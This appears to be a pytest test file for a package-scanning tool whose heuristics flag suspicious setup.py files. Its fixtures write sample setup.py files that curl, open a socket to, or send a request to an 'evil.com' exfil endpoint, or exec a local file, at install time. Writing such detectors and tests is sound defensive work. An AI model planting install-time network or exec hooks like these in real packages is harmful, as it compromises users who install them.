import textwrap
import pytest
from pathlib import Path
from packagealert.heuristics.python import PythonHeuristics


@pytest.fixture
def py_heuristics():
    return PythonHeuristics()


@pytest.fixture
def setup_py_with_subprocess(tmp_path):
    (tmp_path / "setup.py").write_text(textwrap.dedent("""\
        import subprocess
        subprocess.call(["curl", "http://evil.com"])
        from setuptools import setup
        setup(name="evil", version="1.0")
    """))
    return tmp_path


@pytest.fixture
def setup_py_with_socket(tmp_path):
    (tmp_path / "setup.py").write_text(textwrap.dedent("""\
        import socket
        s = socket.socket()
        s.connect(("evil.com", 443))
        from setuptools import setup
        setup(name="evil2", version="1.0")
    """))
    return tmp_path


@pytest.fixture
def setup_py_with_requests(tmp_path):
    (tmp_path / "setup.py").write_text(textwrap.dedent("""\
        import requests
        requests.get("http://evil.com/exfil")
        from setuptools import setup
        setup(name="evil3", version="1.0")
    """))
    return tmp_path


@pytest.fixture
def setup_py_with_exec(tmp_path):
    (tmp_path / "setup.py").write_text(textwrap.dedent("""\
        exec(open("evil.py").read())
        from setuptools import setup
        setup(name="evil4", version="1.0")
    """))
    return tmp_path


@pytest.fixture
def clean_setup_py(tmp_path):
    (tmp_path / "setup.py").write_text(textwrap.dedent("""\
        from setuptools import setup
        setup(name="clean", version="1.0", packages=[])
    """))
    return tmp_path


@pytest.fixture
def no_setup_py(tmp_path):
    return tmp_path


@pytest.mark.asyncio
async def test_subprocess_in_setup_py(py_heuristics, setup_py_with_subprocess):
    signals = await py_heuristics.analyze(setup_py_with_subprocess)
    names = [s.name for s in signals]
    assert "subprocess_in_setup" in names


@pytest.mark.asyncio
async def test_socket_in_setup_py(py_heuristics, setup_py_with_socket):
    signals = await py_heuristics.analyze(setup_py_with_socket)
    names = [s.name for s in signals]
    assert "network_in_setup" in names


@pytest.mark.asyncio
async def test_requests_in_setup_py(py_heuristics, setup_py_with_requests):
    signals = await py_heuristics.analyze(setup_py_with_requests)
    names = [s.name for s in signals]
    assert "http_in_setup" in names


@pytest.mark.asyncio
async def test_exec_in_setup_py(py_heuristics, setup_py_with_exec):
    signals = await py_heuristics.analyze(setup_py_with_exec)
    names = [s.name for s in signals]
    assert "exec_in_setup" in names


@pytest.mark.asyncio
async def test_clean_setup_py(py_heuristics, clean_setup_py):
    signals = await py_heuristics.analyze(clean_setup_py)
    assert signals == []


@pytest.mark.asyncio
async def test_no_setup_py_returns_empty(py_heuristics, no_setup_py):
    signals = await py_heuristics.analyze(no_setup_py)
    assert signals == []
